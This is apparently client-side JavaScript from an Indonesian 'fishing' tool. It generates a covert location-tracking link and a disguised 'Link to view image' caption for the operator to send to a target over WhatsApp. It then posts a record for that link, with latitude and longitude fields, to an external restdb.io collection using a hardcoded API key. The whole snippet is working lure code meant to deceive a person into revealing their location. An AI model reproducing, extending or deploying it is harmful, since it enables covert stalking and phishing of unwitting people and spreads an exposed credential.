        <script>
            localStorage.setItem('setkail', false);


            function getID() {
                min = Math.ceil(1);
                max = Math.floor(99);
                return Math.floor(Math.random() * (max - min) + min)+Date.now(); // The maximum is exclusive and the minimum is inclusive
            }


            $("#buatkail").click(function(){
                               
                if(localStorage.getItem('setkail') == 'false'){
                    
                    let getsource = getID();
                    var getid = 'https://img.storagedata.my.id/view.html?'+getsource;
                    var load = 'https://img.storagedata.my.id/load.html?'+getsource;
                    
                    $("#outkail").html(`
                    <br>
                    <div class="alert alert-success" role="alert">
                        <i class="bi bi-info-circle-fill"></i>  Simpan link ini untuk akses informasi lokasi target.
                    </div>
                    <h5><a target='_blank' href="${getid}">${getid}</h5></a>
                    
                    <br>
                    <div class="alert alert-info" role="alert">
                        <i class="bi bi-whatsapp"></i>  Salin text dibawah ini untuk dijadikan caption gambar/vid ke chat target.
                    </div>
                    <div class="form-group">
    
                        <textarea type="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" value="* _Link to view image_ ${load}" >* _Link to view image_ ${load}</textarea>
                        
                    </div>
                   
                    
                    `)
            
                    localStorage.setItem('setkail', true);

                    const d = new Date();
                    let day = d.getDate();
                    let month = d.getMonth()+1;
                    let year = d.getFullYear();
                    let hour = d.getHours();
                    let minute = d.getMinutes();
                    let waktu = year+'-'+month+'-'+day+' '+hour+':'+minute;
                    

                    var jsondata = {
                        "idumpan": getid,
                        "lat": "-",
                        "long": "-",
                        "datetime": waktu,
                    };

                    var settings = {
                    "async": true,
                    "crossDomain": true,
                    "url": "https://mancingmaniak-4c96.restdb.io/rest/store",
                    "method": "POST",
                    "headers": {
                        "content-type": "application/json",
                        "x-apikey": "6559a01c237ae706a2136889",
                        "cache-control": "no-cache"
                    },
                    "processData": false,
                    "data": JSON.stringify(jsondata)
                    }

                    $.ajax(settings).done(function (response) {
                        console.log(response);
                    });


                }
            });
